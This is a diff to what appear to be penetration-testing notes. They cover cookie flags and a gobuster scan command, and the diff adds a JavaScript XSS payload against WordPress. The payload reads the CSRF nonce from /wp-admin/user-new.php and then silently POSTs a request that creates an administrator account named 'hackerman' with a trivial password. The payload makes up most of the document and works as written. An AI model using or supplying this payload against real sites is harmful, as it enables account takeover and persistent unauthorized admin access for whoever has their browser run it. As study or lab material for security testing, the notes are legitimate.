@@ -5,7 +5,7 @@ sitemap.xml
 HttpOnly prevents JavaScript
 Secure requires https, if not present we could intercept traffic.
 nonce prevents CSRF
-+-------------Retrieve Nonce Header
++-------------Retrieve Nonce Header and create new admin user
 var ajaxRequest = new XMLHttpRequest();
 var requestURL = "/wp-admin/user-new.php";
 var nonceRegex = /ser" value="([^"]*?)"/g;
@@ -13,6 +13,12 @@ ajaxRequest.open("GET", requestURL, false);
 ajaxRequest.send();
 var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
 var nonce = nonceMatch[1];
+# above retrive nonce, below create admin user
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hackerman&email=hacker@man.com&pass1=password&pass2=password&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
 +------------------------------------
 
 gobuster dir -u 10.0.0.1 -w /usr/share/wordlists/dirb/common.txt -t 5
